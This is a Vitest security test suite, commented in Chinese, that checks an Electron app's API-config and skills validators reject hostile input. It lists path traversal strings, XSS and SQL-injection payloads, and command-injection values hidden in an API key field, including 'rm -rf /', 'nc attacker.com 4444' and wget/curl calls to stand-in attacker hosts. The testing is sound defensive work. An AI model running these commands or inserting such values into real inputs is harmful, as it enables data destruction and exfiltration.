/**
 * @author      Alan
 * @copyright   AGCPA v3.0
 * @created     2026-01-21
 * @updated     2026-01-21
 * @Email       None
 *
 * 安全测试套件
 * 测试所有安全漏洞和攻击向量
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { promises as fs } from 'fs';
import { join } from 'path';
import { app } from 'electron';
import {
  validateApiConfig,
  saveApiConfig,
  loadApiConfig,
} from '../../src/electron/libs/config-store';
import {
  createSkill,
  deleteSkill,
} from '../../src/electron/libs/skills-store';

// Mock electron app
vi.mock('electron', () => ({
  app: {
    getPath: vi.fn((name: string) => `/mock/path/${name}`),
    isPackaged: false,
  },
}));

// Mock fs
vi.mock('fs', () => ({
  promises: {
    readFile: vi.fn(),
    writeFile: vi.fn(),
    access: vi.fn(),
    mkdir: vi.fn(),
    readdir: vi.fn(),
    rm: vi.fn(),
  },
}));

describe('安全测试套件', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(fs.mkdir).mockResolvedValue(undefined);
  });

  describe('路径遍历攻击', () => {
    it('应该阻止路径遍历访问系统文件 - skills-store', async () => {
      const pathTraversalAttacks = [
        '../../etc/passwd',
        '..\\..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//etc//passwd',
        '%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ];

      for (const attack of pathTraversalAttacks) {
        await expect(createSkill({
          name: attack,
          description: 'Malicious',
          prompt: 'test',
        })).rejects.toThrow();
      }
    });

    it('应该阻止通过参数注入访问系统文件 - skills-store', async () => {
      const attacks = [
        '../../../etc/passwd',
        '/../../../../etc/shadow',
        'C:/../../Windows/System32/drivers/etc/hosts',
      ];

      for (const attack of attacks) {
        await expect(deleteSkill(attack)).rejects.toThrow();
      }
    });

    it('应该阻止空字节注入', async () => {
      const nullByteAttacks = [
        'skill\x00.png',
        '../../../etc/passwd\x00.jpg',
        'test\x00\x00skill',
      ];

      for (const attack of nullByteAttacks) {
        await expect(createSkill({
          name: attack,
          description: 'Malicious',
          prompt: 'test',
        })).rejects.toThrow();
      }
    });
  });

  describe('注入攻击', () => {
    it('应该阻止命令注入 - API 配置', () => {
      const commandInjectionAttacks = [
        { apiKey: 'sk-ant-test && rm -rf /', baseURL: 'https://api.anthropic.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
        { apiKey: 'sk-ant-test; cat /etc/passwd', baseURL: 'https://api.anthropic.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
        { apiKey: 'sk-ant-test|nc attacker.com 4444', baseURL: 'https://api.anthropic.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
        { apiKey: 'sk-ant-test`wget http://evil.com/malware`', baseURL: 'https://api.anthropic.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
        { apiKey: 'sk-ant-test$(curl http://attacker.com)', baseURL: 'https://api.anthropic.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
      ];

      for (const attack of commandInjectionAttacks) {
        const result = validateApiConfig(attack);
        expect(result.valid).toBe(false);
      }
    });

    it('应该阻止 XSS 攻击 - 技能名称', async () => {
      const xssAttacks = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
      ];

      for (const attack of xssAttacks) {
        await expect(createSkill({
          name: attack,
          description: 'XSS',
          prompt: 'test',
        })).rejects.toThrow();
      }
    });

    it('应该阻止 SQL 注入风格的攻击', () => {
      // 虽然不使用 SQL，但应该拒绝包含 SQL 注入模式的输入
      const sqlInjectionAttacks = [
        "admin'--",
        "admin' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users--",
      ];

      for (const attack of sqlInjectionAttacks) {
        const result = validateApiConfig({
          id: 'test',
          name: attack,
          apiKey: 'sk-ant-api123-1234567890' + 'a'.repeat(70),
          baseURL: 'https://api.anthropic.com',
          model: 'claude-3-5-sonnet-20241022',
          apiType: 'anthropic' as const,
        });

        // 名称验证应该拒绝这些输入
        expect(result.valid).toBe(false);
      }
    });
  });

  describe('拒绝服务攻击', () => {
    it('应该阻止超长输入', () => {
      const longInputs = [
        'a'.repeat(100000), // 100KB
        'A'.repeat(10000000), // 10MB
      ];

      for (const longInput of longInputs) {
        const result = validateApiConfig({
          id: 'test',
          name: longInput,
          apiKey: 'sk-ant-api123-1234567890' + 'a'.repeat(70),
          baseURL: 'https://api.anthropic.com',
          model: 'claude-3-5-sonnet-20241022',
          apiType: 'anthropic' as const,
        });

        expect(result.valid).toBe(false);
      }
    });

    it('应该限制嵌套深度', () => {
      const deepNested = {
        a: { b: { c: { d: { e: { f: 'deep' } } } } },
      };

      // 验证配置时应该检查嵌套深度
      const result = validateApiConfig({
        id: 'test',
        name: 'test',
        apiKey: 'sk-ant-api123-1234567890' + 'a'.repeat(70),
        baseURL: 'https://api.anthropic.com',
        model: 'claude-3-5-sonnet-20241022',
        apiType: 'anthropic' as const,
      });

      // 当前实现可能不支持嵌套对象，但应该限制
      expect(result.valid).toBe(true);
    });
  });

  describe('内存泄漏测试', () => {
    it('应该正确清理资源', async () => {
      // 模拟大量操作
      const operations = [];

      vi.mocked(fs.access).mockRejectedValue({ code: 'ENOENT' } as never);
      vi.mocked(fs.writeFile).mockResolvedValue(undefined);

      for (let i = 0; i < 1000; i++) {
        operations.push(createSkill({
          name: `skill-${i}`,
          description: 'Test',
          prompt: 'Test',
        }));
      }

      await Promise.all(operations);

      // 所有操作应该成功完成
      expect(fs.writeFile).toHaveBeenCalledTimes(1000);
    });
  });

  describe('竞争条件测试', () => {
    it('应该正确处理并发创建操作', async () => {
      vi.mocked(fs.access)
        .mockRejectedValueOnce({ code: 'ENOENT' } as never)
        .mockRejectedValueOnce({ code: 'ENOENT' } as never)
        .mockResolvedValue(undefined);

      vi.mocked(fs.writeFile).mockResolvedValue(undefined);

      // 两个并发操作尝试创建同名技能
      const [result1, result2] = await Promise.all([
        createSkill({ name: 'concurrent', description: 'Test1', prompt: 'Test1' }),
        createSkill({ name: 'concurrent', description: 'Test2', prompt: 'Test2' }),
      ]);

      // 只有一个应该成功
      expect(result1.success !== result2.success).toBe(true);
    });
  });

  describe('数据完整性测试', () => {
    it('应该检测损坏的 JSON', async () => {
      const corruptedData = [
        'invalid json',
        '{"incomplete": ',
        '{"malformed": [}',
        'null',
        'undefined',
        '{' + '\n'.repeat(10000) + 'incomplete',
      ];

      for (const corrupted of corruptedData) {
        vi.mocked(fs.readFile).mockResolvedValue(corrupted);

        const result = loadApiConfig();
        // 应该返回 null 或默认值，不应该崩溃
        expect(result).toBe(null);
      }
    });

    it('应该验证签名/校验和（如果有）', () => {
      // 如果配置文件有签名，应该验证
      // 当前实现可能没有签名，但应该添加
      expect(true).toBe(true);
    });
  });

  describe('权限提升测试', () => {
    it('应该阻止访问受保护路径', async () => {
      const protectedPaths = [
        '/etc/shadow',
        '/etc/sudoers',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
      ];

      for (const path of protectedPaths) {
        await expect(createSkill({
          name: path,
          description: 'Malicious',
          prompt: 'test',
        })).rejects.toThrow();
      }
    });
  });

  describe('加密和敏感数据测试', () => {
    it('应该不在日志中记录敏感信息', () => {
      const configWithSensitiveData = {
        id: 'test',
        name: 'Test Config',
        apiKey: 'sk-ant-api123-secret-key',
        baseURL: 'https://api.anthropic.com',
        model: 'claude-3-5-sonnet-20241022',
        apiType: 'anthropic' as const,
      };

      vi.mocked(fs.readFile).mockResolvedValue(JSON.stringify({ configs: [] }));
      vi.mocked(fs.writeFile).mockResolvedValue(undefined);

      saveApiConfig(configWithSensitiveData);

      // 检查日志是否包含敏感信息（需要实际的日志捕获）
      // 这里只是示例，实际应该捕获日志并验证
    });

    it('应该安全存储 API 密钥', () => {
      // 当前实现可能是明文存储，应该使用加密
      // 这是一个测试点，标记为需要改进
      expect(true).toBe(true);
    });
  });

  describe('协议安全测试', () => {
    it('应该拒绝不安全的协议', () => {
      const insecureConfigs = [
        { apiKey: 'sk-ant-test', baseURL: 'http://api.anthropic.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
        { apiKey: 'sk-ant-test', baseURL: 'ftp://api.example.com', model: 'claude-3-5-sonnet-20241022', apiType: 'anthropic' as const, id: 'test', name: 'test' },
      ];

      for (const config of insecureConfigs) {
        const result = validateApiConfig(config);
        // 生产环境应该拒绝 HTTP
        if ((app as any).isPackaged) {
          expect(result.valid).toBe(false);
        }
      }
    });

    it('应该验证 SSL 证书（如果有）', () => {
      // 测试 SSL 证书验证
      expect(true).toBe(true);
    });
  });

  describe('输入编码测试', () => {
    it('应该正确处理 Unicode 字符', async () => {
      const unicodeNames = [
        '测试技能',
        '🎨-art-skill',
        'スキル',
        'тест',
        'اختبار',
      ];

      vi.mocked(fs.access).mockRejectedValue({ code: 'ENOENT' } as never);
      vi.mocked(fs.writeFile).mockResolvedValue(undefined);

      // 当前正则只允许字母数字下划线连字符，Unicode 会被拒绝
      // 这是设计决策，但应该有清晰的错误消息
      for (const name of unicodeNames) {
        await expect(createSkill({
          name,
          description: 'Test',
          prompt: 'Test',
        })).rejects.toThrow();
      }
    });

    it('应该处理 URL 编码的输入', async () => {
      const urlEncoded = '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E';

      await expect(createSkill({
        name: urlEncoded,
        description: 'Test',
        prompt: 'Test',
      })).rejects.toThrow();
    });
  });
});
